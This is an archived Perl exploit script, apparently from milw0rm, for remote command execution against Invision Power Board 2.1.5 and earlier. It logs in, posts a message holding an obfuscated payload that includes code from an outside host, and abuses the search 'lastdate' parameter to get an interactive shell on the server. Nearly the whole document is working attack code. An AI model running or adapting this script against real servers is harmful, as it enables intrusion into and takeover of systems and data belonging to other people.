<html><head><title>Invision Power Board <= 2.1.5 (lastdate) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl

## Invision Power Board 2.* commands execution exploit by RST/GHC
## vulnerable versions &lt;= 2.1.5
## tested on 2.1.4, 2.0.2
##
## (c)oded by 1dt.w0lf
## RST/GHC
## http://rst.void.ru
## http://ghc.ru


use IO::Socket;
use Getopt::Std;

getopts(&quot;l:h:p:d:f:v:&quot;);

$host     = $opt_h;
$dir      = $opt_d;
$login    = $opt_l;
$password = $opt_p;
$forum    = $opt_f;
$version  = $opt_v || 0;

$|++;

header();
if(!$host||!$dir||!$login||!$password||!$forum) { usage(); }

print &quot;[~]    SERVER : $host\r\n&quot;;
print &quot;[~]      PATH : $dir\r\n&quot;;
print &quot;[~]     LOGIN : $login\r\n&quot;;
print &quot;[~]  PASSWORD : $password\r\n&quot;;
print &quot;[~]    TARGET : $version&quot;;
print (($version)?(' - IPB 2.1.*'):(' - IPB 2.0.*'));
print &quot;\r\n&quot;;

print &quot;[~] Login ... &quot;;

$sock = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-] CONNECTION FAILED&quot;;
$login    =~ s/(.)/&quot;%&quot;.uc(sprintf(&quot;%2.2x&quot;,ord($1)))/eg;
$password =~ s/(.)/&quot;%&quot;.uc(sprintf(&quot;%2.2x&quot;,ord($1)))/eg;
$post     = 'UserName='.$login.'&amp;PassWord='.$password;
$loggedin = 0;
print $sock &quot;POST ${dir}index.php?act=Login&amp;CODE=01 HTTP/1.1\r\n&quot;;
print $sock &quot;Host: $host\r\n&quot;;
print $sock &quot;Connection: close\r\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $sock &quot;Content-length: &quot;.length($post).&quot;\r\n\r\n&quot;;
print $sock &quot;$post&quot;;
print $sock &quot;\r\n\r\n&quot;;
while (&lt;$sock&gt;)
{  
 if(/session_id=([a-f|0-9]{32})/) { $sid = $1; }
}
$sock = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-] CONNECTION FAILED&quot;;
print $sock &quot;GET ${dir}index.php HTTP/1.1\r\n&quot;;
print $sock &quot;Host: $host\r\n&quot;;
print $sock &quot;Cookie: session_id=$sid;\r\n&quot;;
print $sock &quot;Connection: close\r\n\r\n&quot;;
while (&lt;$sock&gt;)
{    
 if(/act=Login&amp;amp;CODE=03/) { $loggedin = 1; last; }
}
if($loggedin) { print &quot; [ DONE ]\r\n&quot;; }
else { print &quot; [ FAILED ]\r\n&quot;; exit(); }

print &quot;[+] SID: $sid\r\n&quot;;

print &quot;[~] Try get md5_check ...&quot;;
$sock = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-] CONNECTION FAILED&quot;;
if($version==1)
 {
 print $sock &quot;GET ${dir}index.php?act=post&amp;do=new_post&amp;f=${forum} HTTP/1.1\r\n&quot;;
 }
else
 {
 print $sock &quot;GET ${dir}index.php?act=Post&amp;CODE=00&amp;f=${forum} HTTP/1.1\r\n&quot;;
 }
print $sock &quot;Host: $host\r\n&quot;;
print $sock &quot;Cookie: session_id=$sid;\r\n&quot;;
print $sock &quot;Connection: close\r\n\r\n&quot;;
while (&lt;$sock&gt;)
 {  
 if($version == 1 &amp;&amp; /ipb_md5_check\s*= \&quot;([a-f|0-9]{32})\&quot;/)  { $md5_check = $1; last; }
 if($version == 0 &amp;&amp; /auth_key' value='([a-f|0-9]{32})/) { $md5_check = $1; last; }
 }
close($sock);
if($md5_check) { print &quot; [ DONE ]\r\n&quot;; print &quot;[+] MD5_CHECK : $md5_check\r\n&quot;; }
else { print &quot; [ FAILED ]\r\n&quot;; exit(); }

print &quot;[~] Create new message ...&quot;;
$sock = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-] CONNECTION FAILED&quot;;
$created = 0;
$text = 'r57ipbxplhohohoeval(include(chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(114).chr(115).chr(116).chr(46).chr(118).chr(111).chr(105).chr(100).chr(46).chr(114).chr(117).chr(47).chr(114).chr(53)'.
        '.chr(55).chr(105).chr(112).chr(98).chr(105).chr(110).chr(99).chr(46).chr(116).chr(120).chr(116))); //';
$post = &quot;st=0&amp;act=Post&amp;s=&amp;f=${forum}&amp;auth_key=${md5_check}&amp;removeattachid=0&amp;CODE=01&amp;post_key=&amp;TopicTitle=justxpl&amp;TopicDesc=justxpl&amp;poll_question=&amp;ffont=0&amp;fsize=0&amp;Post=${text}&amp;enableemo=yes&amp;enablesig=yes&amp;iconid=0&quot;;
print $sock &quot;POST ${dir}index.php HTTP/1.1\r\n&quot;;
print $sock &quot;Host: $host\r\n&quot;;
print $sock &quot;Cookie: session_id=$sid;\r\n&quot;;
print $sock &quot;Connection: close\r\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $sock &quot;Content-length: &quot;.length($post).&quot;\r\n\r\n&quot;;
print $sock &quot;$post&quot;;
print $sock &quot;\r\n\r\n&quot;;
while (&lt;$sock&gt;)
 {  
 if(/Location:/) { $created = 1; last; }
 }
if($created) { print &quot; [ DONE ]\r\n&quot;; }
else { print &quot; [ FAILED ]\r\n&quot;; exit(); }

$sock = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-] CONNECTION FAILED&quot;;
print &quot;[~] Search message ...&quot;;
$post = 'keywords=r57ipbxplhohohoeval&amp;namesearch='.$login.'&amp;forums%5B%5D=all&amp;searchsubs=1&amp;prune=0&amp;prune_type=newer&amp;sort_key=last_post&amp;sort_order=desc&amp;search_in=posts&amp;result_type=posts';
print $sock &quot;POST ${dir}index.php?act=Search&amp;CODE=01 HTTP/1.1\r\n&quot;;
print $sock &quot;Host: $host\r\n&quot;;
print $sock &quot;Cookie: session_id=$sid;\r\n&quot;;
print $sock &quot;Connection: close\r\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $sock &quot;Content-length: &quot;.length($post).&quot;\r\n\r\n&quot;;
print $sock &quot;$post&quot;;
print $sock &quot;\r\n\r\n&quot;;

while (&lt;$sock&gt;)
 {
 if(/searchid=([a-f|0-9]{32})/) { $searchid = $1; last; }
 }

if($searchid) { print &quot; [ DONE ]\r\n&quot;; }
else { print &quot;[ FAILED ]\r\n&quot;; exit(); }
print &quot;[+] SEARCHID: $searchid\r\n&quot;;

$get = 'index.php?act=Search&amp;CODE=show&amp;searchid='.$searchid.'&amp;search_in=posts&amp;result_type=posts&amp;highlite=r57ipbxplhohohoeval&amp;lastdate=z|eval.*?%20//)%23e%00';

while ()
 {
    print &quot;Command for execute or 'exit' for exit # &quot;;
    while(&lt;STDIN&gt;)
     {
        $cmd=$_;
        chomp($cmd);
        exit() if ($cmd eq 'exit');
        last;
     }
    &amp;run($cmd);
 }

sub run()
 {
  $cmd =~ s/(.*);$/$1/eg;
  $cmd =~ s/(.)/&quot;%&quot;.uc(sprintf(&quot;%2.2x&quot;,ord($1)))/eg;
  $cmd2 = '%65%63%68%6F%20%5F%53%54%41%52%54%5F%20%26%26%20';
  $cmd2 .= $cmd;
  $cmd2 .= '%20%26%26%20%65%63%68%6F%20%5F%45%4E%44%5F';
  $sock = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-] CONNECTION FAILED&quot;;
  
  print $sock &quot;GET ${dir}${get}&amp;eharniy_ekibastos=$cmd2 HTTP/1.1\r\n&quot;;
  print $sock &quot;Host: $host\r\n&quot;;
  print $sock &quot;Cookie: session_id=$sid;\r\n&quot;;
  print $sock &quot;Connection: close\r\n\r\n&quot;;

  $on = 0;
  $runned = 0;
  while ($answer = &lt;$sock&gt;)
   {
    if ($answer =~ /^_END_/) { return 0; }
    if ($on == 1) { print &quot;  $answer&quot;; }
    if ($answer =~ /^_START_/) { $on = 1; }
   }
 }
 
sub header()
 {
 print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n&quot;;   
 print &quot; Invision Power Board 2.* commands execution exploit by RST/GHC\r\n&quot;;
 print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n&quot;;
 }
 
sub usage()
 {
 print &quot;r57ipbce.pl -h &lt;host&gt; -d &lt;dir&gt; -l &lt;login&gt; -p &lt;password&gt; -f &lt;forum&gt; -v &lt;version&gt;\r\n\r\n&quot;;
 print &quot;&lt;host&gt;     - host where IPB installed e.g www.ipb.com\r\n&quot;;
 print &quot;&lt;dir&gt;      - folder where IPB installed e.g. /forum/ , /ipb/ , etc...\r\n&quot;;
 print &quot;&lt;login&gt;    - login of any exist user\r\n&quot;;
 print &quot;&lt;password&gt; - and password too )\r\n&quot;;
 print &quot;&lt;forum&gt;    - number of forum where user can create topic e.g 2,4, etc\r\n&quot;;
 print &quot;&lt;version&gt;  - forum version:\r\n&quot;;
 print &quot;             0 - 2.0.*\r\n&quot;;
 print &quot;             1 - 2.1.*\r\n&quot;;
 exit();
 }

# milw0rm.com [2006-04-26]</pre></html>